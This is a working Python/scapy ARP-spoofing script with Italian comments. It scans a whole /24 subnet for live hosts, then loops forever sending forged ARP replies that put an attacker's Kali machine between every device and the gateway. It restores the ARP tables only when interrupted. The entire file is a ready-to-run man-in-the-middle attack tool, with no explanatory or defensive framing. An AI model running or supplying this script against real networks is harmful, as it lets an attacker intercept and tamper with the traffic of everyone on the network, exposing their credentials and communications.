from scapy.all import ARP, Ether, send, srp
import time
import sys

# Indirizzi IP
attacker_mac = "08:00:27:f1:a8:59"  # Sostituisci con il MAC di Kali
network_ip_range = "192.168.17.0/24"  # Intera rete
gateway_ip = "192.168.17.254"  # Router (gateway)

# Ottenere MAC Address
def get_mac(ip):
    print(f"[*] Ottenendo MAC per {ip}...")
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, _ = srp(arp_request_broadcast, timeout=3, verbose=False)

    if answered:
        return answered[0][1].hwsrc

    print(f"[!] Errore: nessuna risposta ARP da {ip}. Controlla la connessione di rete.")
    return None

# Funzione per ottenere tutti gli IP attivi nella rete
def get_active_ips(ip_range):
    print(f"[*] Scansione della rete {ip_range} per IP attivi...")
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, _ = srp(arp_request_broadcast, timeout=3, verbose=False)
    
    active_ips = [received.psrc for sent, received in answered]
    return active_ips

# Funzione per falsificare la tabella ARP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Errore: impossibile ottenere il MAC di {target_ip}")
        return
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)

# Funzione per ripristinare la tabella ARP originale
def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac is None or spoof_mac is None:
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, verbose=False)

print("[*] Iniziando ARP Spoofing...")

active_ips = get_active_ips(network_ip_range)
spoofed_ips = []

try:
    while True:
        for ip in active_ips:
            if ip != gateway_ip:
                spoof(ip, gateway_ip)  # Fingi di essere il router per ogni dispositivo
                spoof(gateway_ip, ip)  # Fingi di essere ogni dispositivo per il router
                spoofed_ips.append(ip)
        time.sleep(2)  # Invia ogni 2 secondi
except KeyboardInterrupt:
    print("\n[!] Spoofing interrotto. Ripristino della rete...")
    for ip in spoofed_ips:
        restore(ip, gateway_ip)
        restore(gateway_ip, ip)
    print("[*] Rete ripristinata. Esci.")
    sys.exit(0)
